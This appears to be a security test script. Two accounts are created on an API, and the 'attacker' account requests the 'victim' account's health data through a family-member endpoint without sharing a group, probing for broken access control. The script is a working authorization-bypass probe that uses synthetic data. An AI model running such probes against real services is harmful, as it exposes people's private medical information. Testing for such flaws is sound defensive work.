import sys, seclib
from lib import Client
name, api = sys.argv[1], sys.argv[2]
seclib.use(api)
A = seclib.signup('famvictim'); B = seclib.signup('famattacker')
a, b = Client(A['token']), Client(B['token'])
print(f'[{name}] A sets blood type + allergy:', a.patch('/medical-profile', {'blood_type': 'AB-'}).status,
      a.post('/medical-profile/allergies', {'name': 'SyntheticPenicillinAllergy'}).status)
print(f'[{name}] B creates own family group:', b.post('/family/create', {'name': 'attacker-group'}).status)
print(f'[{name}] A and B share no group; B GET /family/member-health/<A id>:')
r = b.get(f'/family/member-health/{A["user"]["id"]}')
print('   ', r.status, str(r.body)[:300])
